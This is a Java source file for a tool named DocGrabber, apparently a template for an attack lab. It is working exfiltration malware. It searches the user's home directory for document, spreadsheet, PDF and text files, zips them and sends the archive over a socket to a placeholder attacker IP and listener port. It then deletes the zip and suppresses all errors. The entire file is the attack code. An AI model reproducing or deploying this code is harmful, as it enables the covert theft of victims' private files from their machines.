import java.io.*;
import java.nio.file.*;
import java.net.*;
import java.util.*;
import java.util.stream.*;
import java.util.zip.*;

public class DocGrabber {

    private static final String TARGET_DIR = System.getProperty("user.home");
    private static final String[] SENSITIVE_EXTENSIONS = {".doc", ".docx", ".pdf", ".xls", ".xlsx", ".txt"};
    private static final String TEMP_ZIP = "temp_docs.zip";
    private static final String EXFIL_SERVER = "<<ip>>"; // Change to your attacker VM IP
    private static final int EXFIL_PORT = Integer.parseInt("<<port>>"); // Change to your listener port

    public DocGrabber() throws Exception {
        try {
            // Collect sensitive documents
            List<Path> sensitiveFiles = findSensitiveFiles(TARGET_DIR);
            
            if (!sensitiveFiles.isEmpty()) {
                // Compress and exfiltrate data
                createZipArchive(sensitiveFiles, TEMP_ZIP);
                exfiltrateData(TEMP_ZIP);
                Files.deleteIfExists(Paths.get(TEMP_ZIP));
            }
        } catch (Exception e) {
            // Fail silently
        }
    }

    private List<Path> findSensitiveFiles(String directory) throws IOException {
        return Files.walk(Paths.get(directory))
            .filter(Files::isRegularFile)
            .filter(path -> {
                String filename = path.toString().toLowerCase();
                return Arrays.stream(SENSITIVE_EXTENSIONS)
                    .anyMatch(filename::endsWith);
            })
            .collect(Collectors.toList());
    }

    private void createZipArchive(List<Path> files, String zipName) throws IOException {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipName))) {
            for (Path file : files) {
                zos.putNextEntry(new ZipEntry(file.toString()));
                Files.copy(file, zos);
                zos.closeEntry();
            }
        }
    }

    private void exfiltrateData(String filename) throws IOException {
        try (Socket socket = new Socket(EXFIL_SERVER, EXFIL_PORT);
             FileInputStream fis = new FileInputStream(filename);
             OutputStream os = socket.getOutputStream()) {
            
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
        }
    }

    public static void main(String[] args) throws Exception {
        new DocGrabber();
    }
}